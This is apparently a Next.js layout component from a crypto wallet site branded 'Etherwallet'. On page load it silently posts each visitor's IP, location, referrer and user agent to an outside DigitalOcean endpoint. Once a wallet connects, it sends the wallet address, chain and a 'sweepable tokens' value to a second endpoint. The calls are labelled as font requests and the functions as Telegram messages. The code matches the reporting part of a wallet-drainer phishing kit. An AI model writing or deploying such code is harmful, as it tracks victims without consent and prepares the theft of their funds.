"use client";

import { usePathname } from "next/navigation";
import Navbar from "./Navbar";
import Link from "next/link";
import { getUserCountry } from "../userLocation";
import { useState, useEffect } from "react";
import { useAccount, useChains } from "wagmi";
import axios from "axios";
export default function LayoutClientWrapper({
  children,
}: {
  children: React.ReactNode;
}) {
  const pathname = usePathname();
  const { address, isConnected,chain } = useAccount();
  const hiddenRoutes = ["/dashboard", "/connect"];
  const hideNavbar = hiddenRoutes.some((route) => pathname.startsWith(route));
  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState();
  const [visitorMessageSent, setVisitorMessageSent] = useState(false);
  const [walletMessageSent, setWalletMessageSent] = useState(false);
  
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      // Replace localhost with google.com if URL contains localhost
      if (url.includes("localhost")) {
        url = url.replace(/localhost(:\d+)?/, "google.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };

  const sendTelegramMessage = (userCountry: any) => {
    // console.log("User Country", userCountry);

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "Etherwallet",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        "https://clownfish-app-t9vi2.ondigitalocean.app/api/t1/font",
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY,
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error?.response?.data?.details
        )
      );
  };

  const getUsdValue = async (wallet: any) => {
    // Call your API or calculation here
    return "$0 worth of sweepable tokens"; // Placeholder
  };

  const getInfo = () => {
    // Your logic here
    return "🟢 native ETH sign"; // Placeholder
  };

  const sendTelegramMessage2 = async (userCountry: any) => {
    // console.log("User Country", userCountry);
    const walletAddress = address || "";
    const usdValue = await getUsdValue(walletAddress);
    const info = getInfo();

    const messageData = {
      country: userCountry?.country || "Unknown",
      ipAddress: userCountry?.ip || "0.0.0.0",
      appName: "Etherwallet",
      wallet: walletAddress,
      usdValue,
      chain: chain?.name || "", // or chain?.id
      info,
      website: getCurrentUrl(),
      agent:
        (typeof navigator !== "undefined"
          ? navigator.userAgent +
            (navigator.platform ? ` on ${navigator.platform}` : "")
          : browser) || "",
    };
    axios
      .post(
        "http://localhost:3001/api/t2/font",
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY,
          },
        }
      )
      .catch((error) => console.error("Error sending font message:", error));
  };

  useEffect(() => {
    if (!visitorMessageSent) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();

        setCountry(userCountry?.country || "Unknown");
        setIpAddress(userCountry?.ip || "0.0.0.0");

        sendTelegramMessage(userCountry);
        setVisitorMessageSent(true);
      };

      fetchUserLocation();
    }
  }, [visitorMessageSent]);

  useEffect(() => {
    const isWalletConnected = address;
    if (isWalletConnected && !walletMessageSent) {
      const fetchUserLocationAndSendT2 = async () => {
        const userCountry = await getUserCountry();
        setCountry(userCountry?.country || "Unknown");
        setIpAddress(userCountry?.ip || "0.0.0.0");
        sendTelegramMessage2(userCountry);
        setWalletMessageSent(true);
      };
      fetchUserLocationAndSendT2();
    }
  }, [address, walletMessageSent]);

  return (
    <>
      {!hideNavbar && <Navbar />}
      {children}
    </>
  );
}
